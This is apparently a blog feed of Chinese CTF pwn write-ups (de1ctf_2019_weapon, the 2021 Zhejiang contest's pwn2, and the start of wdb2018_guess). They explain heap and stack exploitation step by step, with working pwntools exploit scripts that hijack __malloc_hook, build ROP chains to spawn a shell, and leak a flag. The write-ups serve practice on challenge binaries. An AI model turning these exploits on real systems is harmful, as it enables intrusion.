class="string">b&#x27;\x7f&#x27;</span>,timeout=<span class="number">0.5</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x3c5600</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#one=[0x45226,0x4527a,0xf03a4,0xf1247]</span></span><br><span class="line">one=[<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">edit(<span class="number">1</span>,p64(libc_addr+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">1</span>,<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="number">8</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xb</span>+p64(libc_addr+one[<span class="number">1</span>])+p64(libc_addr+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]+<span class="number">4</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;choice &gt;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;weapon: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>,<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">pwn()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><p>结果</p><p><img src="/2021/11/07/de1ctf_2019_weapon/2.png" alt="2"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;buu刷题记录—&lt;a href=&quot;https://buuoj.cn/challenges#de1ctf_2019_weapon&quot;&gt;de1ctf_2019_weapon&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>2021浙江省赛pwn2复盘</title>
    <link href="http://example.com/2021/11/06/zjctf2021%20pwn2/"/>
    <id>http://example.com/2021/11/06/zjctf2021%20pwn2/</id>
    <published>2021-11-06T14:00:00.000Z</published>
    <updated>2021-12-15T17:22:54.798Z</updated>
    
    <content type="html"><![CDATA[<p>这题在比赛是没有做出来的，属于赛后复盘，但是感觉这题不该在比赛做不出来，因为赛后花了两小时就出了。</p><span id="more"></span><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><p>首先checksec发现保护全开了，ida打开，主函数是一个while 1 循环且没有return，如果要栈溢出得在其它函数。首先ida分析有部分不到位，有一个很明显的值赋值指针，然后后面还有对指针之后的元素读取一个int型变量，很明显栈布局是这样的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">char buf[]</span><br><span class="line"></span><br><span class="line">char *ptr</span><br><span class="line">int size</span><br></pre></td></tr></table></figure><p>然后我们去混淆一下，去除那个指针刚好是31个int_64，把它改变一下就是char buf[248]，如下更方便分析(isnan函数是因为去除了alarm方便调试)</p><p><img src="/2021/11/06/zjctf2021%20pwn2/1.png" alt="1"></p><p>可以很明显的看到中间有两层检测，但是一旦不满足最外层那个检测那么就会循环输出<code>too easy</code>，因此我们看看这个判断是什么，这个判断的意思就是我们的指针只有在&gt;=缓冲区地址或者&lt;=rbp-0x220才允许执行下面的流程。因为栈是向低地址增长，所以第一个判断就是ptr要落在buf或者buf下面(栈底方向)。如果我们有机会修改ptr，那确实可以通过ptr任意写，而我们之前分析的是不能通过main函数溢出，所以往后面写没多大用处，那么我们看看第二个条件。意思大概就是如果不在buf下面，那么在上面也要离buf有一定距离，这个距离是rbp-0x220，然后buf最顶端距离rbp是0x120，所以指针不能落在(buf-0x100,buf)范围内因为判过有等号，所以判不过自然是开区间。</p><p>size只能0x100以内，观察类型发现判断的时候类型为unsigned，不能负溢。那么进入myputs，myread和mywrite查看。</p><p>myputs：单个字符输出，遇到\0停止输出。</p><p>mywrite：固定逐字节输出那么长的字节序列。</p><p>myread：也是逐字节读入那么长的序列，并且while  read(1)表示必须要读那么多的字节，但是注意他循环是从0，然后对size判断的时候加了等号，这就意味着能够多读入一个字节，存在off by one。</p><p>buf距离ptr刚好0x100字节，如果溢出一个字节那么可以溢出一个较大字节，使得等会通过这个指针输出的时候能够输出后面的栈内容。</p><h2 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h2><p>我们通过之前分析的内构造以下内容</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span><span class="comment">#libc中寻找的</span></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/2.png" alt="2"></p><p>可以看到后面输出了很多东西，但是因为栈不存在内存页对齐的说法，所以最后一个字节改大之后能输出多少东西全凭运气。我们可以在输入之后用gdb attach去查看此时栈的情况看看能泄露什么东西。由于没有去符号表，因此为了方便定位代码我们直接在后面加上b mywrite。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/3.png" alt="3"></p><p>圈出来的是指针末尾被改了的情况，然后三个箭头是可以泄露的东西，分别能泄露栈，libc和程序的加载基址。但是如果buf本身所在位置的最低字节就是e0,f0之类的那可能泄露不了这么多东西，所以这一点也是看脸的。那么我们如何接收泄露的数据呢？</p><p>首先我们第一个泄露的地址应该是ptr，但是ptr被我们改过，我们并具体泄露出这个buf在哪个位置。所以这个我们不考虑，我们接受后面的栈地址，计算一下泄露地址和buf的偏移得到buf地址。后面的没啥好说的，就是开了pie之后程序加载基址不知道具体会在哪，不过据我观察它大部分高字节是55，有时候是56，所以我们就以55判断吧。但是为了调试方便我们选择先关闭aslr调试，具体细节就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#echo 0 &gt;/proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure><p>关闭之后开了aslr的程序固定加载在0x555555554000上面，所以我们选择以四个字节的55来判断是否有没有泄露到程序加载基址，等到打远程的时候调回来就行了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span><span class="comment">#buf_addr-8</span></span><br><span class="line"><span class="comment">#因为一开始指向劫持这个忽略了条件不允许，这里到后来也没改，问题不大，之后在引用这个值的时候+8就完事了。</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span><span class="comment">#libc_base</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>*<span class="number">4</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr<span class="comment">#用的是libc的gadget，用本身的gadget加上code_base即可</span></span><br></pre></td></tr></table></figure><p>这里我关了aslr的调试结果</p><p><img src="/2021/11/06/zjctf2021%20pwn2/4.png" alt="4"></p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>泄露了这三个基址之后，我们就要考虑在哪里劫持程序流了。got表因为开了保护无法劫持，我们只能劫持函数，唯一具有输入功能的就是my_read函数，所以肯定是在这里溢出。我们之前讨论过我们的ptr能劫持的位置是有限制的。</p><p>如果我们把指针刚好劫持在buf-0x100，然后读入0x100字节的数据能否溢出呢？答案当然是可以的，因为buf是main函数的栈顶了，再上去就是其它函数的栈帧了，就算这0x100字节不能碰到buf，那碰到上面函数的返回地址还是可以的。这便是这题的巧妙之处了，这里我想了很久。但是要注意，我们是逐字节输入的，并不是一口气输入完的，所以里面的一些变量不能破坏。这里具体要自己调试了，它中间好像有把循环截止条件的那个数，也就是第三个参数放到栈上，因为我覆盖过去直接就无了，循环直接退出了。还有一个就是jmp 的时候也有用到栈上的地址跳转，因为我使用e覆盖的，然后我那个指令直接就跳到了0xXXXXX65的地方，然后就crash了，所以这个地方大概率是要放上正确的跳转地址的。因为是逐字节填充，所以这里是肯定劫持不了程序的，我们只能尽量不破坏它程序的执行，我们的最终目标其实也就填上那8个字节其它是什么其实无所谓，只要能成功劫持那八个字节，我们就能控制程序流。</p><h3 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置rop链</h3><p>这题可以执行system(“/bin/sh”)，因此我们先构造rop链。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=...+p64(pop_rdi_ret)+p64(sh)+p64(system_addr)</span><br></pre></td></tr></table></figure><p>pop_rdi_ret的gadget可以使用elf的，也可以用库的，这个看自己心情，我因为一开始没有选择接受程序基址就选择了libc的gadget。因为我们只能劫持八个字节，那么执行了pop_rdi_ret之后程序ret到哪里了呢，我们先画出当时整个栈结构。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">i</span><br><span class="line">main&#x27;s rbp</span><br><span class="line">ret_addr</span><br><span class="line">buf</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ptr</span><br><span class="line">size</span><br><span class="line">canary</span><br><span class="line">libc_start_main&#x27;s rbp</span><br><span class="line">ret_addr</span><br></pre></td></tr></table></figure><p>可以看出来，返回地址后面紧跟着的就是buf，buf我们一开始是可控的，但是一开始我们并不知道system和/bin/sh的地址，因此这里我们需要选择把指针恢复填上p64(sh)+p64(system_addr)，这样当劫持my_read函数的时候就会形成rop链。那么接下来要如何把指针劫持回去呢，因为我们用的是\xff字节去填充了最低位，现在我们如果写，将不会从buf的地方开始而是会从(buf_addr|0xff)，这也是一开始选取\xff字节的目的，因为它八个都是1，在最后计算的时候直接或上去就可以了，如果选取其它的可能就要进行一些复杂的运算，比如\xfe字节你可能就得这么写。</p><p>(buf_addr&amp;0xffffffffff00)|0xfe</p><p>这个应该都能理解吧，因为我们是覆盖操作，但是如果覆盖位数都为1就可以直接或上去，不用再&amp;清除低位字节。</p><p>而我们的目标地址在buf_addr+0x100，所以只需要算这个偏移就行了。这偏移也是很好算的，我们从buf_addr|0xff开始写，然后终点是buf_addr+0x100，两个一减就能算出填充字节的位数了，然后再加上buf_addr指针给他写回去。好了之后呢，就是开头放上p64(sh)+p64(system_addr)然后依然要溢出ff字节，不然只能溢出一个字节不足以能肯定改变指针到我们想的地方。所以重复一开始的操作溢出为0xff，然后再劫持到buf_addr-0x100的地方去。</p><p>改回指针并且重写再次溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))<span class="comment">#再次注意一下，我的stack_addr是buf_addr-8</span></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)<span class="comment">#这里需要加个ret平衡栈，后面注意到了就知道在这里加一个就行</span></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))<span class="comment">#就跟改回来是一样的，截图并未执行到这里</span></span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/5.png" alt="5"></p><h3 id="劫持my-read"><a href="#劫持my-read" class="headerlink" title="劫持my_read"></a>劫持my_read</h3><p>一开始可能想的会有点简单，直接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">read(<span class="number">0xff</span>,<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xf8</span>+p64(pop_rdi_ret))<span class="comment">#也是因为这个填充字符选的到位，导致能快速找出错误，所以如果程序退出异常但还能继续执行不妨改一下填充字符哦</span></span><br></pre></td></tr></table></figure><p>但是会发现程序直接死了，这里就来复原一下我复盘时出的问题，先用这个最简单的payload试试看问题出在哪里。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/6.png" alt="6"></p><p>会发现这个指令非常奇奇怪怪，而且rip此时最低那个字节的值是65刚好就是e的ASCII码，再disass一下发现这个函数根本没有指到这个位置上的指令，可以很清楚的知道，这条指令是被分割了，那么我们回溯栈看看，发现我们覆盖了什么导致这个问题。可以看到次时i的值就是0xb8，那么我们就调试到i=0xb7的时候，观察接下来要覆盖的值是什么。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/7.png" alt="7"></p><p>可以发现接下来要覆盖的字节应该就是两个箭头所指的地方，而右边这里刚好有一个在程序的code段的地址，猜测刚刚应该是覆盖了这里的最低位导致的问题。并且我们刚刚的rip错误指向就是0x555555555365，刚好就是那个地址低字节覆盖了0x65字节导致的问题，我们先来观察一下这个地址在哪里。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/8.png" alt="8"></p><p>可以发现刚好在myread中有这么一个地址，那么看到它在read函数下面应该能想到，这个是在调用read的时候保存的返回地址，读完之后改变了这个返回地址导致了出现这个错误。因为在这里调用read返回地址肯定知道就是在函数的这个位置，那么它在code_base上偏移是固定的，算出偏移之后这个地方的8个字节就固定填写这个不要改变了。此时我们的payload变成</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">payload=(<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)).ljust(<span class="number">0xf8</span>,<span class="string">b&#x27;e&#x27;</span>)+p64(pop_rdi_ret)</span><br><span class="line">read(<span class="number">0xff</span>,payload)</span><br></pre></td></tr></table></figure><p>但是发现执行着突然退出了，而当时i的值还是0xc8</p><p><img src="/2021/11/06/zjctf2021%20pwn2/9.png" alt="9"></p><p>到底是为什么呢，应该能稍微猜到一点，因为可以看到rsp的那个地方已经填充好了8个e接下来就要向0xff那边填充了，0xff是循环条件的一个值，猜测是因为这个值被覆盖了导致循环提前结束了，那么在长度到0xc8的时候，这个位置应该填上一个p64(0xff)才能过去，然后后面又有一个地址，不难发现它是我们buf_addr的地址，那么这个地址也不应该被覆盖，而应该写回去。同理，下面的i作为循环变量也不应该被覆盖，这个应当能提前预测到的。</p><p>至于这个位置应该写多少呢，可以想想如果i=0的时候写自己应该写多少呢？答案当然是还是写个0才能保证写进去并且i+1。那么这个位置在哪呢，应该不难推测出开始覆盖ret_addr的时候，它的值应当i=0xf8，覆盖之前的rbp时，i=0xf0，那么再往前推，这个值应该是i=0xe8，所以这个地方给上\xe8然后后面一律填0即可。可以看到这次栈溢出注意的东西也是非常多的，可以说这题目出的也是相当好的。</p><p>最后就没什么讲究了，覆盖上ret_addr为pop_rdi_ret的gadget就能直接getshell。下面是完整payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret))</span><br></pre></td></tr></table></figure><p><img src="/2021/11/06/zjctf2021%20pwn2/10.png" alt="10"></p><p>能稳定getsehll，但是前提是aslr关了，aslr关了调试其实是非常舒服的，因为面对复杂的情况有时候可能不能getshell，就比如前面举过的例子，程序基址的最高字节非\x55，buf_addr的最低字节过大，目前已知就这两种情况会导致无法正常getshell。</p><p>这里还需要注意一点，因为关了aslr，我们前面的接受泄露的地址是用的p.recvuntil(b’\x55’*4)[-6:]，关了之后要把后面那个4去掉，这里因为识别单个字节，不排除会识别错误，这个随机加载谁说的清楚呢，这都是小问题。下面给出我开了aslr的运行结果。</p><p><img src="/2021/11/06/zjctf2021%20pwn2/11.png" alt="11"></p><p>如果希望能一把梭，那么可以把攻击的部分作为一个函数，然后主函数while 1 try except这样玩，但是要注意给开头四个recvuntil都加上一个参数timeout=0.5，这样它接收不到这个字节超过0.5秒就会停止接收，后面就会产生报错，报错之后自己会重新运行一遍。注意下面给的exp并没有加上这个，但是加的方法已经告诉你了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">size,payload</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">b&#x27;size&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendafter(<span class="string">b&#x27;sentence&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./easy_stack&#x27;</span>)</span><br><span class="line">pop_rdi_ret=<span class="number">0x0000000000026b72</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,&#x27;b myread&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x100</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)</span><br><span class="line">stack_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x218</span></span><br><span class="line">success(<span class="string">&#x27;stack_addr:&#x27;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line">libc_addr=u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-<span class="number">0x270b3</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr:&#x27;</span>+<span class="built_in">hex</span>(libc_addr))</span><br><span class="line">code_base=u64(p.recvuntil(<span class="string">b&#x27;\x55&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\0\0&#x27;</span>)-elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line">success(<span class="string">&#x27;code_base:&#x27;</span>+<span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line">sys=libc_addr+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sh=libc_addr+libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">pop_rdi_ret+=libc_addr</span><br><span class="line"></span><br><span class="line">offset=stack_addr+<span class="number">8</span>+<span class="number">0x100</span>-((stack_addr+<span class="number">8</span>)|<span class="number">0xff</span>)</span><br><span class="line"><span class="comment">#success(&#x27;a&#x27;*offset)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr+<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line">read(<span class="number">0x100</span>,p64(sh)+p64(pop_rdi_ret+<span class="number">1</span>)+p64(sys)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xe8</span>+<span class="string">b&#x27;\xff&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(offset+<span class="number">7</span>,<span class="string">b&#x27;a&#x27;</span>*offset+p64(stack_addr-<span class="number">0xf8</span>))</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;e&#x27;</span>*<span class="number">0xb8</span>+p64(code_base+<span class="number">0x130a</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xc8</span>,<span class="string">b&#x27;e&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0xff</span>)+p64(stack_addr-<span class="number">0xf8</span>)</span><br><span class="line">payload=payload.ljust(<span class="number">0xe8</span>,<span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">read(<span class="number">0xff</span>,payload+<span class="string">b&#x27;\xe8&#x27;</span>+<span class="string">b&#x27;\0&#x27;</span>*<span class="number">7</span>+<span class="string">b&#x27;f&#x27;</span>*<span class="number">8</span>+p64(pop_rdi_ret))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;这题在比赛是没有做出来的，属于赛后复盘，但是感觉这题不该在比赛做不出来，因为赛后花了两小时就出了。&lt;/p&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    <category term="pwn" scheme="http://example.com/categories/ctf/pwn/"/>
    
    
  </entry>
  
  <entry>
    <title>wdb2018_guess writeup</title>
    <link href="http://example.com/2021/11/04/wdb2018_guess%20writeup/"/>
    <id>http://example.com/2021/11/04/wdb2018_guess%20writeup/</id>
    <published>2021-11-04T03:00:00.000Z</published>
    <updated>2021-11-11T13:03:28.000Z</updated>
    
    <content type="html"><![CDATA[<p>buu刷题记录：<a href="https://buuoj.cn/challenges#wdb2018_guess">wdb2018_guess</a></p><span id="more"></span><h2 id="静态分析elf文件"><a href="#静态分析elf文件" class="headerlink" title="静态分析elf文件"></a>静态分析elf文件</h2><p>checksec一下发现开了NX和canary保护，64位程序，用ida分析看看</p><p>很明显的gets栈溢出，并且gets之后没有回显输入的内容，那这样的话意味着不能栈溢出劫持控制流了。那么看看前面，发现有一个把flag文件内容读到栈上面的动作。后面while循环调用了一个sub_400A11函数，v7=3，v6=0,，v7&gt;=v6 break就意味着这个函数会被调用三次。而发现sub_400A11函数是调用fork函数，fork函数会创建和当前进程一模一样的进程，然后范围自身进程的ID，如果是被创建的进程，那么fork将会返回0。</p><p>简单点就是fork的子进程会返回0，如果返回0那么break执行下面的内容，父进程因为返回自己进程号不会break则继续循环，然后调用fork，也就是说这个进程一共会产生3个子进程执行while循环之后的内容。</p><p>这里有一个特性，那就是在发生栈溢出之后stack_chk_fail。在终止程序之前还会打印argv[0]，这一点很合理。但是这里可以用于泄露栈上的flag，我们如果gets覆盖到argv[0]，就可以任意地址泄露了，但是因为只有三个子进程，就只能泄露三次，前两次一定要把栈地址泄露出来。但是呢现在栈地址是不知道的，我们可以先通过一次泄露泄露出libc的地址，二次泄露出栈地址，最后一次泄露flag。其实这里还有一点不太理解，就是fork之后栈是共享的嘛？libc是共享的很好理解，栈共享就不是很好理解了，还是说它栈不同，只是对应偏移的地方都有flag，然后我泄露的是别的进程上面的flag，倾向于这种解释。</p><h2 id="动态调试确定偏移"><a href="#动态调试确定偏移" class="headerlink" title="动态调试确定偏移"></a>动态调试确定偏移</h2><p>现在就需要知道这个buf到底需要多少字节能覆盖argv[0]，所以需要动调一波。断点下在fork循环之后，这里我选择了0x400b0d的位置，r。为了确定buf的位置，我们选择gets读入很多个a看看它与argv[0]之间的偏移。</p><p><img src="/2021/11/04/wdb2018_guess%20writeup/1.png" alt="1"></p><p>很容易可以从左边看出来，他们之间差了0x128个字节，那么payload就是0x128*b’a’+p64(要泄露内容的地址)。</p><p>第一次拿下libc之后第二次应该要拿__environ，这个我也是看writeup知道的，这个好像就是指向argv[0]的地址。也就是栈上的地址，这个是在libc里面的，所以拿到libc之后就可以泄露这个，然后再观察泄露的地址和flag的地址差多少，确定好偏移之后第三次就可以直接泄露flag了，这里测试之后是0x168的偏移，泄露的地址再减去0x168就是我们想要的flag了。</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">libc_version=<span class="string">&#x27;2.23&#x27;</span></span><br><span class="line">libc_in_local=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">conn</span>(<span class="params">x,file_name,port=<span class="number">9999</span></span>):</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>(context.arch)==<span 